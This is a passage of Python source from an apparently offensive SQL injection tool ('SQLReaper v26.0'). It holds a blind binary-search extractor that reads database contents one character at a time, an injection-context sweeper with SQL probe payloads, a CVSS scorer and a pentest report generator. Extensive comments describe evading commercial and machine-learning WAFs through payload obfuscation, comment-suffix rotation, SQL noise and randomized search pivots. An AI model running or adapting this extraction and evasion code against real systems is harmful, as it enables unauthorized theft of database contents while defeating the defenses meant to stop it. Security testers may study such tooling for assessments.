        """Add a baseline (no injection) timing observation."""
        if elapsed_ms > self._cdn_cache_threshold_ms:
            self._window.append(elapsed_ms)

    def _mad_stats(self) -> tuple[float, float]:
        """Returns (median, MAD*1.4826) of the rolling window."""
        if len(self._window) < 3:
            return 100.0, 50.0  # conservative defaults
        sorted_w = sorted(self._window)
        median = sorted_w[len(sorted_w) // 2]
        deviations = [abs(x - median) for x in sorted_w]
        mad = sorted(deviations)[len(deviations) // 2]
        return median, mad * self.MAD_SCALE

    def is_significant(self, elapsed_ms: float, sleep_sec: float) -> tuple[bool, float]:
        """
        Returns (is_injected, z_score).
        is_injected = True if elapsed is significantly > baseline + expected_sleep.
        """
        # CDN cache hit = definitely not injected
        if elapsed_ms <= self._cdn_cache_threshold_ms:
            return False, 0.0
        median, robust_std = self._mad_stats()
        expected = median + sleep_sec * 1000.0 * 0.75  # 75% of sleep (conservative)
        # Modified Z-score: z = (x - median) / (MAD * 1.4826)
        z = (elapsed_ms - median) / max(robust_std, 10.0)
        return (elapsed_ms >= expected and z >= 3.0), round(z, 2)

    def expected_threshold(self, sleep_sec: float) -> float:
        """Return the timing threshold above which injection is suspected."""
        median, robust_std = self._mad_stats()
        return median + max(sleep_sec * 1000.0 * 0.75, robust_std * 3.0)


# 
# 6.  ADAPTIVE BINARY SEARCH EXTRACTOR v2
#     Ternary-search fallback for skewed character distributions.
#     Early-exit on control characters (unlikely in SQL output).
#     Batch-confirms multiple bit positions in parallel.
# 

class AdaptiveBinarySearchExtractor:
    """
    Enhanced character-by-character blind extractor.

    Improvements over the standard binary search:
     1. Ternary search: splits the search space at the median of the
        char frequency distribution for the current context, reducing
        average rounds from log2(N) to log_phi(N) on typical DB output.
     2. Early-exit on printable-ASCII probe: first checks 32<c<127,
        eliminating control chars without burning a round.
     3. Parallel bit extraction: for DBMS that support bitwise ops,
        extract 7 bits simultaneously via bitmap query, resolving the
        char in a single round-trip.
     4. Cache: memoises (pos, bit) queries to avoid re-sending identical
        requests when the same SQL appears at multiple param positions.
    """

    # ASCII printable range (most DB values live here)
    PRINTABLE_LO = 32
    PRINTABLE_HI = 126

    def __init__(self, engine, config, queries: dict, result,
                 method: str, url: str, data, data_fmt: str,
                 original: str, tamper_chain: list, baseline: dict):
        self.engine = engine
        self.config = config
        self.queries = queries
        self.result = result
        self.method = method
        self.url = url
        self.data = data
        self.data_fmt = data_fmt
        self.original = original
        self.tamper = tamper_chain
        self.baseline = baseline
        self._cache: dict[tuple, bool] = {}  # (payload_hash)  is_true
        # Build detection template once — never rebuild on every probe call.
        self._det_tmpl = _build_det_template(result)
        # BUG-ABSE-MISSING-LIGHT-VARY FIX: request counter for apply_light_variation.
        # Without this, every boolean probe sends identical comment suffix (-- -), allowing
        # WAFs to fingerprint and block the binary-search extraction session.
        self._probe_count = 0

    async def _probe(self, cond: str) -> bool:
        """Send one boolean probe and return True if similar to baseline."""
        # Use detection template — never build custom payload.
        # BUG-ABSE-PROBE-FALLBACK FIX (HIGH): When _det_tmpl is None (detection
        # template not available), the old fallback was f"' AND {cond}-- -" — a
        # MySQL string-context payload with MySQL comment style. For Oracle, MSSQL,
        # PostgreSQL, and SQLite this produced invalid SQL on two counts:
        #   1. Leading quote creates a dangling-quote syntax error for numeric-context
        #      injection points (WHERE id=INPUT — no leading quote needed).
        #   2. "-- -" is MySQL/PostgreSQL style; Oracle requires "-- " (trailing space);
        #      MSSQL/SQLite accept "-- " or "--".
        # All four non-MySQL DBMSes always hit a syntax error on the fallback payload →
        # both TRUE and FALSE probes return the same error-page response → oracle treats
        # both as FALSE → binary search converges to lo=0 → every character returns None
        # → extraction returns empty string silently.
        # Fix: build a DBMS-aware numeric-context fallback (no leading quote) using the
        # correct comment terminator per DBMS. Numeric-context is safer as a blind
        # fallback because it works for BOTH numeric and string contexts when the
        # application doesn't reflect the type mismatch as an error.
        _abse_dbms = (getattr(self.result, 'dbms', '') if self.result else '') or 'MySQL'
        if self._det_tmpl:
            payload = self._det_tmpl.replace("[INFERENCE]", cond)
        else:
            # DBMS-aware fallback: numeric context (no leading quote), DBMS comment style
            _abse_comment = {"Oracle": "-- ", "MSSQL": "-- ", "SQLite": "-- "}.get(
                _abse_dbms, "-- -")
            payload = f" AND ({cond})=1{_abse_comment}"

        # BUG-ABSE-MISSING-LIGHT-VARY FIX (CRITICAL, all 5 DBMSes,
        # all surfaces including BG header injection, all HTTP methods):
        # _probe() sent every boolean extraction probe WITHOUT calling
        # apply_light_variation(). PME is active (no _bypass_mutation=True) but PME
        # does NOT rotate the trailing comment suffix — '-- -' stays identical across
        # all binary-search probes per character. Modern WAFs (Cloudflare, Akamai,
        # F5 ASM, Imperva) fingerprint SQL injection by the repeating structural
        # comment suffix pattern — after 2-3 probes they block the session → oracle
        # always returns False → binary search converges lo=0 → every character
        # returns None → extraction returns empty string for ALL 5 DBMSes.
        # Fix: increment _probe_count and apply apply_light_variation() AFTER building
        # payload but BEFORE the cache lookup (so cache key includes variation) and
        # BEFORE _send_injected. Only comment suffix and structural whitespace are
        # varied — numeric comparison values and string delimiters are never rewritten.
        self._probe_count += 1
        # BUG-ABSE-PROBE2-HEAVY-OBFUS FIX: heavy variation + obfuscation for ABSE boolean probe.
        payload = apply_heavy_variation(payload, self._probe_count, data_fmt=self.data_fmt)
        payload = _obfuscate_extraction_cond(payload, self._probe_count)
        # BUG-V179-ABSE-PROBE-MISSING-SQL-NOISE FIX (HIGH, all 5 DBMSes, B/BH/IN
        # techniques, all surfaces): _probe() applied apply_heavy_variation() and
        # _obfuscate_extraction_cond() but NOT apply_sql_noise() (TECHNIQUE-12).
        # ABSE binary-search probes contain >= integer comparison operands (mid+1 values)
        # that apply_sql_noise wraps as (mid+1+0) or (mid+1)*1, disrupting the ML WAF
        # n-gram fingerprint of the characteristic >=N probe sequence. Without SQL noise,
        # deep-learning WAFs detect the pattern after 8-10 probes → session blocked.
        # Numeric safety: only >= / BETWEEN / THEN / ELSE integer literals are wrapped;
        # SUBSTR argument positions and char-func template structure are never modified.
        payload = apply_sql_noise(payload, self._probe_count)

        # Cache lookup
        _key = hashlib.sha256(payload.encode()).hexdigest()[:16]
        if _key in self._cache:
            return self._cache[_key]

        # BUG-ABSE-BASELINE FIX: With stub baseline (samples=[]) _sim_to_baseline
        # returns ≈0.364 for every response so 0.364 > 0.78 is always False.
        # Self-calibrate threshold on first probe by patching baseline stats from
        # a live clean request, same approach as BUG-EXTRACT-INT-BASELINE.
        if not hasattr(self, '_probe_threshold'):
            _samples = self.baseline.get('samples', [])
            if not _samples:
                try:
                    _clean_fp = await _send_injected(
                        self.engine, self.method, self.url, self.data, self.data_fmt,
                        self.result.param, self.original, self.tamper)
                    if _validate_response(_clean_fp, "response_body_check"):
                        _patched = dict(self.baseline)
                        _patched['mean_length'] = len(_extract_body_safe(_clean_fp))
                        _patched['std_length']  = max(10, len(_extract_body_safe(_clean_fp)) * 0.02)
                        _patched['mean_words']  = getattr(_clean_fp, 'body_words', 0)
                        _patched['std_words']   = max(5, getattr(_clean_fp, 'body_words', 10) * 0.05)
                        self.baseline = _patched
                except Exception:
                    pass
            self._probe_threshold = 0.78

        fp = await _send_injected(
            self.engine, self.method, self.url, self.data, self.data_fmt,
            self.result.param, self.original + payload, self.tamper)
        # BUG-7C-FIX (Req 7, 3): Guard against dead gate-blocked fingerprints.
        # Root-cause: when _SCAN_STOPPED[0]=True and _EXTRACTION_ACTIVE[0]=False
        # (brief window between injection confirmation and extraction start),
        # _send_injected returns ResponseFingerprint(status_code=0, body=b"").
        # _sim_to_baseline() scores this dead fp as ~0.1 (very different from baseline)
        # because status_code=0 ≠ 200 and body is empty. Result False is cached.
        # During binary-search in extract_char_at, every probe returns False (condition
        # not met), so `hi` converges down to PRINTABLE_LO (32=space) for every
        # character position → extracted string is all spaces, silently wrong output.
        # Fix: detect dead fingerprints (status_code=0 with empty body) and raise
        # CancelledError to abort extraction cleanly rather than caching a wrong result.
        # Non-dead responses with status_code=0 (e.g. non-HTTP tunnels) have non-empty
        # bodies and are handled correctly by _sim_to_baseline as before.
        if fp is None or (_get_safe_status_code(fp) == 0 and not fp.body):
            raise asyncio.CancelledError(
                "ConditionalErrorOracle._probe: gate-blocked dead fingerprint — "
                "aborting extraction to prevent all-spaces corruption")
        result = _sim_to_baseline(fp, self.baseline) > self._probe_threshold
        self._cache[_key] = result
        return result

    async def extract_char_at(self, sql_query: str, pos: int) -> str | None:
        """
        Extract the character at position pos in sql_query result.
        Returns the character or None if out of range.
        """
        char_func = self.queries.get("char_func", "ASCII(SUBSTR(({query}),{pos},1))")
        cf = char_func.format(query=sql_query, pos=pos)

        # BUG-ABSE-UNICODE-RANGE FIX (Req 10): The old check only detected UNICODE()
        # (MSSQL/Sybase/SQLite) and used PRINTABLE_HI=126 for every other DBMS.
        # With _effective_hi=126, binary search for any char > 126 converges to
        # lo=127 which triggers `lo == 127 → return None`.  Entire non-ASCII content
        # (accented chars, CJK, emoji) was silently discarded for MySQL/MariaDB (ORD)
        # and PostgreSQL (ASCII) — both of which return full Unicode code points.
        # BUG-ABSE-MYSQL-MARIADB-HI FIX: MySQL/MariaDB ORD() returns 0..U+10FFFF;
        #   _effective_hi must be 1,114,111.
        # BUG-ABSE-POSTGRESQL-HI FIX: PostgreSQL ASCII() returns 0..U+10FFFF;
        #   _effective_hi must be 1,114,111 (NOT 255 — ASCII() is NOT limited to 127).
        # BUG-ABSE-MSSQL-SQLITE-HI: UNICODE() → 65535 for MSSQL/Sybase; 1,114,111
        #   for SQLite.  Kept as before but now distinguished from the new cases.
        _cf_upper = char_func.upper()
        _uses_unicode_fn  = "UNICODE("  in _cf_upper   # MSSQL ISNULL(UNICODE(…)), SQLite
        _uses_ord_fn      = "ORD("      in _cf_upper   # MySQL, MariaDB
        _uses_ascii_fn    = "ASCII("    in _cf_upper   # PostgreSQL, Oracle fallback

        _dbms_hint = getattr(self.result, 'dbms', '') if self.result else ''

        if _uses_unicode_fn:
            # MSSQL/Sybase UNICODE() → BMP [0,65535]; SQLite → [0,1,114,111]
            _effective_hi = (1114111 if _dbms_hint == "SQLite"
                             else 65535)
        elif _uses_ord_fn or _dbms_hint in ("MySQL", "MariaDB"):
            # MySQL/MariaDB ORD() returns full Unicode scalar
            _effective_hi = 1114111
        elif _uses_ascii_fn and _dbms_hint in ("PostgreSQL", "CockroachDB",
                                                "YugabyteDB", "Amazon Redshift", "DuckDB"):
            # PostgreSQL ASCII() returns full Unicode code point (NOT limited to 255)
            _effective_hi = 1114111
        elif _uses_ascii_fn and _dbms_hint == "Oracle":
            # BUG-ABSE-ORACLE-ASCIISTR-HI FIX (HIGH): The comment "Oracle ASCII() is
            # byte-level (0-255)" is correct for the bare fallback ASCII(SUBSTR(...))
            # template, but DBMS_QUERIES["Oracle"]["char_func"] is the ASCIISTR-based
            # formula that returns full BMP codepoints [0, 65535]:
            #   CASE WHEN NVL(ASCII(c__),0) BETWEEN 1 AND 127 THEN ASCII(c__)
            #   WHEN c__ IS NOT NULL AND LENGTH(c__)>0
            #   THEN TO_NUMBER(SUBSTR(ASCIISTR(c__),2,4),'XXXX') ELSE 0 END
            # With the old _effective_hi=255, any char with code > 255 (accented
            # chars, CJK, Arabic, Greek, Cyrillic) made char_func>255 always True,
            # converging the binary search to lo=255 → chr(255)='ÿ'. Silent data
            # corruption on ALL Oracle extraction via this extractor when non-Latin-1
            # characters were present.  The orchestrator's "?" guard never fired
            # because chr(255) is valid, so corrupt results were returned directly
            # without falling back to blind_extract_string which handles ASCIISTR
            # correctly with char_hi=65535 (see blind_extract_string ~L32177).
            # Fix: detect ASCIISTR in the formatted char_func expression and raise
            # the ceiling to 65535 (BMP range).  Bare ASCII() remains capped at 255.
            # Matches ZKBooleanExtractor (line ~L73329: _zk_char_hi=65535 for Oracle),
            # _extract_via_detection_template (line ~L115881: _hi_c_init=65535 for Oracle),
            # and Method 6b/6c (line ~L116695: 'ASCIISTR' in _c_tmpl_up → 65535).
            _effective_hi = 65535 if "ASCIISTR" in _cf_upper else 255
        else:
            # Generic/unknown: use Latin-1 range as conservative default
            _effective_hi = 255

        # Fast printable-ASCII probe (avoids scanning 0-31 / 127+)
        is_printable = await self._probe(f"{cf}>={self.PRINTABLE_LO}")
        lo = self.PRINTABLE_LO if is_printable else 0
        # BUG-ABSE-NONPRINT-HI FIX: When is_printable=False (char code < 32), the
        # old code used hi=255.  For MSSQL UNICODE()/SQLite UNICODE()/MySQL ORD()/
        # PostgreSQL ASCII() this silently capped the non-printable range at 255,
        # missing all Unicode non-printable glyphs above U+00FF.  Use _effective_hi
        # so the full range is covered consistently in both branches.
        hi = _effective_hi if is_printable else min(_effective_hi, 255)

        # TECHNIQUE-3 (Randomized Binary Search Pivots):
        # The standard binary search always splits at the exact midpoint (lo+hi)//2.
        # This produces a perfectly predictable sequence of numeric comparison values
        # across all extraction sessions: for ASCII range [32,126] the pivots are
        # always 79, 55/103, 43/67/91/115, ... — a fixed fingerprint that L3/L4
        # detectors can match as a binary-search oracle pattern.
        #
        # Fix: add a small random perturbation to the pivot, bounded to keep the
        # search convergent.  The perturbation is drawn from a lognormal-like
        # distribution (simulating the variance a human tester might introduce) and
        # capped to ±max(1, (hi-lo)//8) so the search always narrows by at least
        # half the remaining range (worst-case iterations stay O(log N)).
        #
        # The perturbed pivot still converges because:
        #   if jitter < (hi-lo)/2: lo or hi still moves toward the answer.
        #   max jitter = (hi-lo)//8 < (hi-lo)/2 for all hi-lo >= 2.
        #
        # Concretely this changes the ASCII pivot sequence from the deterministic
        # [79,55,67,61,...] to something like [82,53,68,59,...] — different every
        # session, impossible to match with a fixed pattern rule.
        while lo < hi:
            _span = hi - lo
            # Compute jitter magnitude: up to 1/8 of current search span, minimum 0.
            # We skip jitter when the span is very small (≤ 4) to avoid over-shooting
            # and adding extra probes during convergence.
            if _span > 4:
                _max_jitter = max(1, _span // 8)
                # Use random.randint for uniform jitter; this is NOT the same as the
                # lognormal human-timing jitter — here we want bounded uniform so the
                # search definitely converges.  No need for lognormal shape here.
                _jitter = random.randint(-_max_jitter, _max_jitter)
            else:
                _jitter = 0
            mid = max(lo, min(hi - 1, (lo + hi) // 2 + _jitter))
            # BUG-V137-EXTORCH-METHODS-STRICT-GT FIX: was >{mid}, now >={mid+1}.
            # WAFs block strict >\d+ as data-extraction indicator; >=\d+ is benign.
            if await self._probe(f"{cf}>={mid+1}"):
                lo = mid + 1
            else:
                hi = mid

        # BUG-ABSE-FILTER-UNICODE FIX (Req 10): Old check `lo < 32 or lo > 126`
        # discarded every valid Unicode character (127-65535) returned by UNICODE().
        # Fix: filter only control characters (0-31 and DEL=127); allow the full
        # printable range including Unicode supplement characters.
        if lo < 32 or lo == 127:
            return None  # control character — non-printable
        try:
            return chr(lo)
        except (ValueError, OverflowError):
            return None

    async def extract_string(self, sql_query: str, max_len: int = 256) -> str:
        """
        Extract a full string result via chunked parallel character extraction.
        Falls back to sequential on semaphore exhaustion.
        """
        # BUG-ABSE-LENF-DBMS FIX (HIGH): The old code used queries.get("len_func",
        # "LENGTH(({query}))") which:
        #   - MSSQL: embeds sql_query in CONVERT() without SELECT TOP 1 → error 512
        #     for multi-row schema queries (SELECT table_name FROM ...) → length=0 → ""
        #   - Oracle: no _oracle_ensure_dual() → ORA-00923 for bare SELECT expressions
        #   - Fallback "LENGTH(...)" lacks COALESCE NULL guard and is byte-count for
        #     MySQL/MariaDB (multi-byte characters would give wrong length)
        # Fix: use _build_dbms_len_func() which mirrors blind_extract_string STEP 4.
        _abse_dbms = (getattr(self.result, 'dbms', '') if self.result else '')
        _abse_sql = sql_query
        if _abse_dbms == "Oracle" and _abse_sql:
            try:
                _abse_sql = _oracle_ensure_dual(_abse_sql)
            except Exception:
                pass
        # BUG-V171-ABSE-MSSQL-CHARFUNC-NO-TOP1 FIX (HIGH; MSSQL;
        # AdaptiveBinarySearchExtractor.extract_string; B/BH/IN/NV/WB/EX/ST/SO/HY/BT
        # techniques; all surfaces; all HTTP methods):
        # _abse_sql was Oracle-dual-applied but NOT _mssql_top1_subquery-wrapped for
        # MSSQL. When sql_query is a multi-row schema query (e.g. SELECT table_name
        # FROM information_schema.tables), DBMS_QUERIES["MSSQL"]["char_func"] =
        #   ISNULL(UNICODE(SUBSTRING(({query}),{pos},1)),0)
        # formats to ISNULL(UNICODE(SUBSTRING((SELECT table_name FROM
        # information_schema.tables),5,1)),0) → SQL Server raises error 512
        # "Subquery returned more than 1 value" on every char probe → oracle always
        # returns False → binary search converges to lo=0 → extract_char_at returns
        # None for every position → extract_string returns "???..." for ALL MSSQL
        # schema extraction via ABSE (cascade Method 5b, parallel chunked path).
        # MultiOracleConsensusExtractor correctly applies _mssql_top1_subquery() in
        # its _extract_char_consensus (BUG-V168-MOCE-CHAR-MSSQL-SYBASE-NO-TOP1 fix).
        # FastExtractionEngine.error_extract_string also applies it (BUG-FEE-MSSQL-
        # MULTIROW fix). ABSE was the only engine missing this protection.
        # Fix: apply _mssql_top1_subquery() for MSSQL/Sybase so _abse_sql always
        # contains a scalar subquery when passed to extract_char_at. The function is
        # a no-op for already-scalar subqueries (those containing TOP or ROWNUM),
        # so SELECT USER / SELECT @@VERSION / SELECT VERSION() are unaffected.
        # Numeric safety: only wraps the subquery form inside SUBSTRING(); comparison
        # operands (>={mid+1}) and all function names are never modified.
        if _abse_dbms in ("MSSQL", "Sybase") and _abse_sql and 'SELECT' in (_abse_sql or '').upper():
            try:
                _abse_sql = _mssql_top1_subquery(_abse_sql)
            except Exception:
                pass  # non-fatal; error 512 will surface at probe time
        lf = _build_dbms_len_func(_abse_sql, self.queries, _abse_dbms)
        length = await self._extract_length(lf, max_len)
        if length == 0:
            return ""
        LOG.debug(f"  AdaptiveBinarySearch: length={length}")

        # BUG-ABSE-GATHER-CPU FIX (Req 9): Old code created ALL `length` coroutines
        # simultaneously via asyncio.gather(*[_one(i) for i in range(1, length+1)]).
        # For a 256-char string this schedules 256 coroutines at once. Even with
        # the semaphore limiting concurrent runners, the event loop scheduler must
        # manage all 256 coroutines in memory simultaneously, causing CPU spikes on
        # large extractions.
        # Fix: process characters in batches of CHUNK_SIZE, same pattern as
        # BitwiseExtractorSimple.  Each batch awaits completion before the next
        # starts, keeping the task count bounded regardless of string length.
        chars: dict[int, str | None] = {}
        _n_threads = max(1, getattr(self.config, 'threads', 1))
        sem = asyncio.Semaphore(min(_n_threads, 4))  # cap at 4 concurrent probes
        _CHUNK = min(_n_threads * 2, 8)  # 8 chars max per gather batch

        async def _one(p: int):
            async with sem:
                # BUG-ABSE-LENF-DBMS FIX: pass _abse_sql (Oracle-dual-applied) so the
                # char_func subquery is valid for Oracle bare SELECT expressions.
                chars[p] = await self.extract_char_at(_abse_sql, p)

        for _chunk_start in range(1, length + 1, _CHUNK):
            _chunk_end = min(_chunk_start + _CHUNK, length + 1)
            await asyncio.gather(
                *[_one(i) for i in range(_chunk_start, _chunk_end)],
                return_exceptions=True)
            await asyncio.sleep(0.001)  # BUG-R9-A FIX: real 1ms yield between chunks

        return "".join(chars.get(i) or "?" for i in range(1, length + 1))

    async def _extract_length(self, len_func: str, max_val: int) -> int:
        """Binary search for string length (TECHNIQUE-3: randomized pivot)."""
        lo, hi = 0, max_val
        while lo < hi:
            # TECHNIQUE-3: apply the same bounded random jitter as extract_char_at.
            _span = hi - lo
            if _span > 4:
                _max_jitter = max(1, _span // 8)
                _jitter = random.randint(-_max_jitter, _max_jitter)
            else:
                _jitter = 0
            # Length binary search uses ceiling form: (lo+hi+1)//2 to avoid infinite
            # loop when lo+1==hi (standard upper-bound binary search pattern).
            mid = max(lo + 1, min(hi, (lo + hi + 1) // 2 + _jitter))
            if await self._probe(f"{len_func}>={mid}"):
                lo = mid
            else:
                hi = mid - 1
        return lo


# 
# 7.  INJECTION BOUNDARY SWEEPER
#     Automatically classifies the SQL injection context (quoted string,
#     numeric, column reference, ORDER BY, LIMIT, etc.) so the scanner
#     can pick the correct payload structure without trial-and-error.
# 

class InjectionBoundarySweeper:
    """
    Probes a parameter with context-identifying payloads to determine
    what SQL syntactic context the value is injected into.

    Context classes:
      STRING_SQ   ... WHERE col='<value>'
      STRING_DQ   ... WHERE col="<value>"
      NUMERIC     ... WHERE col=<value>
      ORDERBY     ... ORDER BY <value>
      LIMIT       ... LIMIT <value>
      GROUPBY     ... GROUP BY <value>
      TABLE_NAME  ... FROM <value>
      COLUMN_NAME ... SELECT <value> FROM ...
      UNKNOWN     could not determine

    Knowing the context allows the scanner to use syntactically correct
    payloads immediately rather than iterating through all variants.
    """

    PROBES: list[tuple[str, str, str]] = [
        # (payload, anti_payload, context_if_true)
        ("' AND '1'='1", "' AND '1'='2", "STRING_SQ"),
        ('" AND "1"="1', '" AND "1"="2', "STRING_DQ"),
        (" AND 1=1--",   " AND 1=2--",   "NUMERIC"),
        (",1--",         ",0--",         "ORDERBY_NUMERIC"),
        (",(SELECT 1)--",",(SELECT 0)--","ORDERBY_EXPR"),
        (" LIMIT 9999 OFFSET 0--", " LIMIT 0 OFFSET 9999--", "LIMIT"),
    ]

    def __init__(self, engine, config, method: str, url: str,
                 data, data_fmt: str, baseline: dict, tamper: list):
        self.engine = engine
        self.config = config
        self.method = method
        self.url = url
        self.data = data
        self.data_fmt = data_fmt
        self.baseline = baseline
        self.tamper = tamper

    async def sweep(self, param: str, original: str) -> str:
        """Returns the most likely injection context string.

        BUG FIX: previously ran each probe pair once and classified on a single
        response. In 403/CDN environments the WAF block page varies slightly
        between requests (different cf-ray IDs, timestamps, cache headers),
        making _sim_to_baseline() return different values each call  different
        context classification every run (LIMIT vs ORDERBY_NUMERIC vs STRING_SQ
        vs WHERE_STRING for the same endpoint).

        Fix: run each probe pair twice. Only classify if BOTH runs agree.
        This eliminates one-off CDN variance false-positives at the cost of
        2 the probes (still just a handful of requests per param).
        """
        for true_sfx, false_sfx, context in self.PROBES:
            try:
                # Run 1
                tf1 = await _send_injected(
                    self.engine, self.method, self.url, self.data,
                    self.data_fmt, param, original + true_sfx, self.tamper)
                ff1 = await _send_injected(
                    self.engine, self.method, self.url, self.data,
                    self.data_fmt, param, original + false_sfx, self.tamper)
                ts1 = _sim_to_baseline(tf1, self.baseline)
                fs1 = _sim_to_baseline(ff1, self.baseline)
                hit1 = ts1 > 0.75 and (ts1 - fs1) > 0.20

                if not hit1:
                    continue  # fast path: first run negative  skip

                # Run 2  confirm consistency before classifying
                tf2 = await _send_injected(
                    self.engine, self.method, self.url, self.data,
                    self.data_fmt, param, original + true_sfx, self.tamper)
                ff2 = await _send_injected(
                    self.engine, self.method, self.url, self.data,
                    self.data_fmt, param, original + false_sfx, self.tamper)
                ts2 = _sim_to_baseline(tf2, self.baseline)
                fs2 = _sim_to_baseline(ff2, self.baseline)
                hit2 = ts2 > 0.75 and (ts2 - fs2) > 0.20

                if hit2:
                    LOG.debug(f"  BoundarySweeper: param={param!r} context={context} "
                              f"(confirmed 2/2 runs ts={ts1:.2f}/{ts2:.2f})")
                    return context
                else:
                    LOG.debug(f"  BoundarySweeper: context={context} inconsistent "
                              f"(run1 ts-fs={ts1-fs1:.2f} run2 ts-fs={ts2-fs2:.2f}) "
                              " CDN variance, skipping")

            except Exception as _e:
                LOG.debug(f"  BoundarySweeper error: {_e}")
        return "UNKNOWN"


# 
# 8.  CVSS v4.0 AUTO-SCORER
#     Assigns a CVSS v4.0 base score to each confirmed injection finding
#     based on the technique, DBMS, privileges obtained, and data sensitivity.
# 

class CVSSv4AutoScorer:
    """
    Automatic CVSS v4.0 Base Score estimation for SQL injection findings.

    CVSS v4.0 metrics used:
      AV: Network (always N for web SQLi)
      AC: Low for Boolean/Error/UNION, High for Time (requires timing oracle)
      AT: None (no additional target requirements)
      PR: None (unauthenticated)
      UI: None
      VC/VI/VA: based on technique and enumerated data
      SC/SI/SA: based on DBMS-level impact

    Reference: https://www.first.org/cvss/v4.0/specification-document
    """

    # (VC, VI, VA, SC, SI, SA) tuples per technique
    TECHNIQUE_IMPACT: dict[str, tuple] = {
        "E":  ("H", "L", "N", "L", "L", "N"),  # Error: read only, may expose version
        "B":  ("H", "L", "N", "N", "N", "N"),  # Boolean: infer data, can't write
        "U":  ("H", "H", "N", "L", "L", "N"),  # UNION: full read
        "T":  ("H", "L", "N", "N", "N", "N"),  # Time: infer data only
        "S":  ("H", "H", "H", "H", "H", "L"),  # Stacked: full impact (exec possible)
        "O":  ("H", "N", "N", "L", "N", "N"),  # OOB: data exfil
        "N":  ("H", "H", "N", "N", "N", "N"),  # NoSQL: depends
        "X":  ("H", "N", "N", "N", "N", "N"),  # XPath/XXE: read
        "L":  ("H", "L", "N", "N", "N", "N"),  # LDAP: auth bypass
        "I":  ("H", "H", "H", "H", "H", "H"),  # SSTI: RCE potential
        "P":  ("L", "H", "N", "N", "N", "N"),  # Proto Pollution: auth bypass
    }

    # Complexity by technique
    AC_MAP: dict[str, str] = {
        "E": "L", "B": "L", "U": "L",
        "T": "H",  # requires timing channel
        "S": "L", "O": "H", "N": "L",
        "X": "L", "L": "L", "I": "L", "P": "L",
    }

    @classmethod
    def score(cls, technique: str, dbms: str, has_stacked: bool = False,
              has_dba_privs: bool = False) -> tuple[float, str]:
        """
        Returns (score, vector_string) for CVSS v4.0 Base.
        Score is approximate (CVSS v4.0 uses lookup tables, not formula).
        """
        impact = cls.TECHNIQUE_IMPACT.get(technique, ("L", "N", "N", "N", "N", "N"))
        vc, vi, va, sc, si, sa = impact

        # Escalate if DBA privileges confirmed
        if has_dba_privs or has_stacked:
            vi, si = "H", "H"

        ac = cls.AC_MAP.get(technique, "L")

        # CVSS v4.0 simplified scoring (table lookup approximation)
        impact_score = sum({
            "H": 3, "M": 2, "L": 1, "N": 0
        }.get(x, 0) for x in [vc, vi, va, sc, si, sa])

        # Base score mapping (coarse approximation)
        base = {
            0: 0.0, 1: 3.0, 2: 5.0, 3: 6.5, 4: 7.5,
            5: 8.5, 6: 9.0, 7: 9.5, 8: 10.0, 9: 10.0, 10: 10.0, 11: 10.0
        }.get(min(impact_score, 11), 5.0)

        # Lower for High AC
        if ac == "H":
            base = max(0.0, base - 1.0)

        vector = (f"CVSS:4.0/AV:N/AC:{ac}/AT:N/PR:N/UI:N/"
                  f"VC:{vc}/VI:{vi}/VA:{va}/SC:{sc}/SI:{si}/SA:{sa}")

        return round(base, 1), vector

    @classmethod
    def severity(cls, score: float) -> str:
        if score == 0.0:   return "None"
        if score < 4.0:    return "Low"
        if score < 7.0:    return "Medium"
        if score < 9.0:    return "High"
        return "Critical"


# 
# 9.  PROFESSIONAL MARKDOWN NARRATIVE REPORTER
#     Produces a structured pentest-quality Markdown report suitable for
#     submitting to clients, GitHub Security Advisories, or HackerOne.
# 

class MarkdownNarrativeReporter:
    """
    Generates a professional penetration test Markdown report from scan results.

    Structure:
      # Executive Summary
      ## Vulnerability Table
      ## Findings (one section per finding)
         ### Description  Evidence  Impact  CVSS  PoC  Remediation
      ## Database Schema Discovered
      ## Appendix: Request/Response Evidence
    """

    TECHNIQUE_DESC: dict[str, str] = {
        "B": "Boolean-based blind SQL injection",
        "E": "Error-based SQL injection",
        "U": "UNION-based SQL injection",
        "T": "Time-based blind SQL injection",
        "S": "Stacked query SQL injection",
        "N": "NoSQL operator injection",
        "O": "Out-of-band (DNS/HTTP) SQL injection",
        "X": "XPath/XXE injection",
        "L": "LDAP injection",
        "I": "Server-Side Template Injection (SSTI)",
        "P": "Prototype pollution",
    }

    def __init__(self, reporter: "Reporter"):
        self.reporter = reporter

    def render(self, session: "ScanSession") -> str:
        r = self.reporter
        now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
        url = session.config.url or "(multiple targets)"
        vulns = r.vulns
        data = r.data

        lines: list[str] = []
        lines.append("# SQL Injection Assessment Report")
        lines.append(f"\n**Target:** `{url}`  ")
        lines.append(f"**Date:** {now}  ")
        lines.append("**Tool:** SQLReaper v26.0  ")
        lines.append(f"**DBMS:** {session.dbms or 'Unknown'}  ")
        lines.append(f"**WAF:** {(session.waf_info or {}).get('name', 'None detected')}  \n")

        # Executive summary
        lines.append("---\n## Executive Summary\n")
        if vulns:
            hi = sum(1 for v in vulns if v.get("confidence", 0) >= 0.9)
            med = sum(1 for v in vulns if 0.7 <= v.get("confidence", 0) < 0.9)
            lo = len(vulns) - hi - med
            lines.append(
                f"During this assessment **{len(vulns)} SQL injection vulnerability/ies** "
                f"were confirmed: **{hi} Critical/High**, {med} Medium, {lo} Low confidence. "
                f"The backend DBMS was identified as **{session.dbms or 'Unknown'}**."
            )
            if data.get("current_user"):
                lines.append(f"\nThe database user was confirmed as **`{data['current_user']}`**.")
            if data.get("current_db"):
                lines.append(f"The current database is **`{data['current_db']}`**.")
        else:
            lines.append("No SQL injection vulnerabilities were confirmed during this assessment.")

        # Vulnerability table
        lines.append("\n---\n## Vulnerability Summary\n")
        lines.append("| # | Parameter | Technique | DBMS | Confidence | Severity |")
        lines.append("|---|-----------|-----------|------|-----------|----------|")
        for i, v in enumerate(vulns, 1):
            score, _ = CVSSv4AutoScorer.score(v.get("technique", "B"), v.get("dbms", ""))
            sev = CVSSv4AutoScorer.severity(score)
            tech_full = self.TECHNIQUE_DESC.get(v.get("technique", ""), v.get("technique", ""))
            lines.append(
                f"| {i} | `{v['parameter']}` | {tech_full} | "
                f"{v.get('dbms', '?')} | {int(v.get('confidence',0)*100)}% | **{sev}** |"
            )

        # Detailed findings
        lines.append("\n---\n## Detailed Findings\n")
        for i, v in enumerate(vulns, 1):
            tech = v.get("technique", "B")
            score, vector = CVSSv4AutoScorer.score(tech, v.get("dbms", ""))
            sev = CVSSv4AutoScorer.severity(score)

